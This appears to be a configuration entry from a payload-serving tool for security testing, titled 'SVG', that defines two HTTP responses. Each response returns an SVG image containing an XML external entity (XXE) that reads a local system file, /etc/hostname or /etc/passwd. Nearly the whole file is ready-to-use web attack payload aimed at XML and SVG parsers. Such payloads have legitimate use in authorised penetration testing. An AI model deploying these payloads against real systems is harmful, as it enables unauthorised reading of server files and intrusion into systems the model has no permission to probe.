---
title: SVG
description: Returns an SVG payload with XXE to get files
weight: 1
payloads:
  - type: HTTPX
    project_id: 1
    sort_order: 1
    pattern: /sh$
    data: '{"headers":{"Content-Type":"text/xml"},"body":"\u003c?xml version=\"1.0\" standalone=\"yes\"?\u003e\\n\u003c!DOCTYPE test [ \u003c!ENTITY xxe SYSTEM \"file:///etc/hostname\" \u003e ]\u003e\\n\u003csvg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"\u003e\\n\u003ctext font-size=\"16\" x=\"0\" y=\"16\"\u003e\u0026xxe;\u003c/text\u003e\\n\u003c/svg\u003e"}'

  - type: HTTPX
    project_id: 1
    sort_order: 1
    pattern: /sv$
    data: '{"headers":{"Content-Type":"image/svg+xml"},"body":"\u003c?xml version=\"1.0\" standalone=\"yes\"?\u003e\u003c!DOCTYPE ernw [ \u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\" \u003e ]\u003e\u003csvg width=\"500px\" height=\"100px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"\u003e\u003ctext font-family=\"Verdana\" font-size=\"16\" x=\"10\" y=\"40\"\u003e\u0026xxe;\u003c/text\u003e\u003c/svg\u003e"}'
---

Depends on an internal code